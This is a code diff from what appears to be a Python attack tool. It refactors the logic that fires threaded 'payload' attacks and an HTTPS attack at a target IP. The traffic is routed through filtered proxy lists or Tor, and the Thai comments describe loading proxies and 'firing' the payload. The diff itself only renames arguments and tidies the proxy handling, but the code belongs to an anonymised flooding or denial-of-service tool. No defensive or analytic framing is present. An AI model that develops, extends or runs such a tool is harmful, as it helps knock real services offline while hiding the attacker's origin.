@@ -686,7 +686,7 @@ if check_target(target_ip, port_target):
         elif args.payload_attack:
                 
             if args.proxy_ip and args.proxy_port:
-                send_payload(proxyip=args.proxy_ip, proxy_p=args.proxy_port)
+                send_payload(proxy_ip=args.proxy_ip, proxy_port=args.proxy_port)
             elif args.tor_ip and args.tor_port:
                 if check_tor_running():
                     print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor is running and reachable{styles['reset']}")
@@ -707,31 +707,24 @@ if check_target(target_ip, port_target):
                 send_payload()
             
             t = threading.Thread(target=send_payload, daemon=True)
-        if args.payload_attack and args.proxy_list:
+        elif args.payload_attack and args.proxy_list:
             if args.check_proxy_list:
+                # โหลดและกรอง proxy
                 proxy_list = load_proxies()
-                print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
+                print(f"Testing {len(proxy_list)} proxies...")
                 use_all_proxies(proxy_list)
                 want_to_continue()
 
                 good_proxies = filter_proxies(proxy_list)
-                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Proxy that can actually be used{styles['reset']}, StatusCode: {back_colors['green']}200{back_colors['reset']}")
-                for p in good_proxies:
-                    print(p)
-                date = datet()
-                file_output = f"working_proxies_{date}.txt"
+                file_output = f"working_proxies_{datet()}.txt"
                 with open(file_output, "w") as f:
-                    for p in good_proxies:
-                        f.write(p + "\n")
+                    f.write("\n".join(good_proxies))
 
-                # โหลด proxy จากไฟล์ที่เพิ่งเซฟ
-                with open(file_output, "r") as f:
-                    proxies = [line.strip() for line in f if line.strip()]
-
+                proxies = good_proxies
             else:
                 proxies = load_proxies()
 
-            # เริ่มยิง payload
+            # ยิง payload
             for proxy in proxies:
                 t = threading.Thread(target=send_payload, args=(proxy,))
                 t.daemon = True
@@ -740,6 +733,7 @@ if check_target(target_ip, port_target):
 
             for t in threads:
                 t.join()
+
         # Https Attak
         elif args.port == 443:
             t = threading.Thread(target=https_attack, daemon=True)
